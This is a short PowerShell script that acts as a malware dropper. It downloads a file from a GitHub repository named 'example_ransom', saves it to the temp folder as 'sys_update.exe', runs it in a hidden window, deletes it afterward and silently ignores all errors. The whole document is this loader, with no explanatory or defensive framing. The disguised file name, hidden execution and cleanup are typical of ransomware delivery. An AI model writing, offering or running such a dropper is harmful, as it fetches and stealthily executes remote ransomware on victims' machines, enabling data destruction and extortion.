$url = "https://github.com/apoloxwzz/example_ransom"
$destino = "$env:TEMP\sys_update.exe"

try {
    Invoke-WebRequest -Uri $url -OutFile $destino -UseBasicParsing
    if (Test-Path $destino) {
        Start-Process -FilePath $destino -WindowStyle Hidden -Wait
        Remove-Item $destino -Force
    }
} catch {}
